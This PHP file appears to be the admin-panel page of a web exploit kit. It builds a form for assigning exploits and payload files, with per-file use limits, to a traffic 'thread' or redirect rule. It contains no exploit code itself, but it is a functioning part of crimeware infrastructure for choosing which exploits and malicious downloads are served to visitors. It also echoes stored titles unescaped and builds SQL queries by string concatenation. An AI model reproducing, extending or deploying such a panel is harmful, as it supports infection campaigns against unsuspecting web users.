<?php 
if( !defined("ADMIN_LOADED") ) 
{
    exit();
}

list($exploits, $files) = Browser2::getalldata(array( "exploits", "files" ));
$ruleID = (isset($_POST["ruleID"]) ? intval($_POST["ruleID"]) : null);
$ids = array(  );
if( $ruleID != null ) 
{
    $_files = db::select("select FileID from FilesInRules where RuleID = " . $ruleID . " order by Sort asc");
    foreach( $_files as $f ) 
    {
        $ids[] = $f["FileID"];
    }
}

$resFiles = array(  );
foreach( $files as &$file ) 
{
    $curLimit = Threads::findfile($file["ID"]);
    $limit = $file["FileLimit"];
    if( $file["FileLimit"] == 0 - 1 ) 
    {
        $curLimit = abs($curLimit) - 1;
        $file["FileLimit"] = "&#8734;";
    }
    else
    {
        $curLimit = $file["FileLimit"] - $curLimit;
    }

    $file["CurLimit"] = $curLimit;
    $file["LimitStr"] = $file["CurLimit"] . "/" . $file["FileLimit"];
    if( $limit == 0 - 1 || $file["CurLimit"] < $file["FileLimit"] || array_search($file["ID"], $ids) !== false ) 
    {
        $resFiles[] = $file;
    }

}
$files = $resFiles;
$imgPath = Config::get("AdminScriptName") . "?" . Config::get("MainParamName") . "=file&type=img&file=";
if( $ruleID != null ) 
{
    $rule = db::selectone("*", "Rules", "ID = " . $ruleID);
    $_exploits = explode(",", $rule["Exploits"]);
    echo "<script>\r\n\t";
    if( $rule["isRedirect"] ) 
    {
        echo "\t\tThreads.checkAll('exploits');\r\n\t";
    }

    echo "\t";
    foreach( $_exploits as $id ) 
    {
        if( $id == "" ) 
        {
            continue;
        }

        echo "\t\tThreads.addExploit('exploits_";
        echo $id;
        echo "','exploits','exploit.gif');\r\n\t";
    }
    echo "\t";
    foreach( $_files as $f ) 
    {
        echo "\t\tThreads.addFile('files_";
        echo $f["FileID"];
        echo "','files', '');\r\n\t";
    }
    echo "\t";
    if( $rule["Title"] != "default" ) 
    {
        echo "\t\tvar el = \$('threadTitle');\r\n\t\tel.value = '";
        echo $rule["Title"];
        echo "';\r\n\t";
    }

    echo "</script>\r\n";
}

echo "\r\n<div class=\"main2\">\r\n\t<div class=\"title\">";
echo Lang::get("StatisticsExploitsLabel");
echo "</div>\r\n\t<div class=\"title\">";
echo Lang::get("StatisticsFilesLabel");
echo "</div>\r\n\t<div class=\"close\" id=\"addThreadClose\"></div>\r\n\t<div style=\"clear:both;\"></div>\r\n\t\r\n\t<div class=\"addThreadList\">\r\n\t\t<div id=\"scrollbar_container\" class=\"result\">  \r\n\t\t\t<div id=\"scrollbar_track_exploits\"><div id=\"scrollbar_handle\"></div></div>  \r\n\t\t\t<div id=\"selectedExploits\" class=\"disabled\">\r\n\t\t\t\t<div class=\"disableDiv\">\r\n\t\t\t\t\t<div class=\"disableRegion\"></div>\r\n\t\t\t\t\t<div class=\"disableLabel\">";
echo Lang::get("ExploitsFilter");
echo "</div>\r\n\t\t\t\t</div>\r\n\t\t\t\t<ul id=\"exploitsResult\"></ul>\r\n\t\t\t</div> \r\n\t\t</div>\r\n\t\t<div class=\"controls\">\r\n\t\t\t<div><a href=\"javascript:Threads.checkAll('exploits')\"><img src=\"";
echo $imgPath;
echo "check.png\" width=\"15px\" height=\"11px\"/> ";
echo Lang::get("CheckAll");
echo "</a></div>\r\n\t\t\t<div><a href=\"javascript:Threads.uncheckAll('exploits')\"><img src=\"";
echo $imgPath;
echo "check2.png\" width=\"15px\" height=\"11px\"/> ";
echo Lang::get("UncheckAll");
echo "</a></div>\r\n\t\t</div>\r\n\t\t<div id=\"scrollbar_container\">  \r\n\t\t\t<div id=\"scrollbar_track_exploits2\"><div id=\"scrollbar_handle\"></div></div>  \r\n\t\t\t<div id=\"exploitsList\" class=\"widgetList\">\r\n\t\t\t\t<ul>\r\n\t\t\t\t\t";
foreach( $exploits as $k => $arr ) 
{
    echo "\t\t\t\t\t\t<li ";
    if( $k % 2 ) 
    {
        echo "class=\"odd\"";
    }

    echo " onclick=\"Threads.addExploit('exploits_";
    echo $arr["id"];
    echo "','exploits','exploit.gif')\"><a id=\"exploits_";
    echo $arr["id"];
    echo "\">";
    echo $arr["title"];
    echo "</a></li>\r\n\t\t\t\t\t";
}
echo "\t\t\t\t</ul>\r\n\t\t\t</div>\r\n\t\t</div>\r\n\t</div>\r\n\t<div class=\"addThreadList\">\r\n\t\t<div id=\"scrollbar_container\" class=\"result\">  \r\n\t\t\t<div id=\"scrollbar_track_files\"><div id=\"scrollbar_handle\"></div></div>  \r\n\t\t\t<div id=\"selectedFiles\" class=\"disabled\">\r\n\t\t\t\t<div class=\"disableDiv\">\r\n\t\t\t\t\t<div class=\"disableRegion\"></div>\r\n\t\t\t\t\t<div class=\"disableLabel\">";
echo Lang::get("FilesFilter");
echo "</div>\r\n\t\t\t\t</div>\r\n\t\t\t\t<ul id=\"filesResult\"></ul>\r\n\t\t\t</div> \r\n\t\t</div>\r\n\t\t<div class=\"controls\">\r\n\t\t\t<div><a href=\"javascript:Threads.checkAll('files')\"><img src=\"";
echo $imgPath;
echo "check.png\" width=\"15px\" height=\"11px\"/> ";
echo Lang::get("CheckAll");
echo "</a></div>\r\n\t\t\t<div><a href=\"javascript:Threads.uncheckAll('files')\"><img src=\"";
echo $imgPath;
echo "check2.png\" width=\"15px\" height=\"11px\"/> ";
echo Lang::get("UncheckAll");
echo "</a></div>\r\n\t\t</div>\r\n\t\t<div id=\"scrollbar_container\">  \r\n\t\t\t<div id=\"scrollbar_track_files2\"><div id=\"scrollbar_handle\"></div></div>  \r\n\t\t\t<div id=\"filesList\" class=\"widgetList\">\r\n\t\t\t\t<ul>\r\n\t\t\t\t\t";
foreach( $files as $k => $f ) 
{
    echo "\t\t\t\t\t\t<li ";
    if( $k % 2 ) 
    {
        echo "class=\"odd\"";
    }

    echo " onclick=\"Threads.addFile('files_";
    echo $f["ID"];
    echo "','files')\"><a id=\"files_";
    echo $f["ID"];
    echo "\">";
    echo $f["Title"];
    echo " - ";
    echo $f["LimitStr"];
    echo "</a></li>\r\n\t\t\t\t\t";
}
echo "\t\t\t\t</ul>\r\n\t\t\t</div>\r\n\t\t</div>\r\n\t</div>\r\n\t<div style=\"clear:both\"></div>\r\n\t<div class=\"foot\">\r\n\t\t";
if( $ruleID == null || $rule["Title"] != "default" ) 
{
    echo "\t\t\t<div class=\"prev\" onclick=\"Threads.prev()\">";
    echo Lang::get("Back");
    echo "</div>\r\n\t\t\t<div class=\"threadTitle\"><input type=\"text\" id=\"threadTitle\" value=\"\" maxlength=\"32\"/></div>\r\n\t\t";
}
else
{
    echo "\t\t\t<div class=\"prevLong\" onclick=\"Threads.toRedirects()\">";
    echo Lang::get("ToRedirects");
    echo "</div>\r\n\t\t";
}

echo "\t\t<div class=\"submit\"><input type=\"button\" onclick=\"Threads.submit()\" value=\"";
echo Lang::get("ConfigSubmitButton");
echo "\"/></div>\r\n\t</div>\r\n</div>";

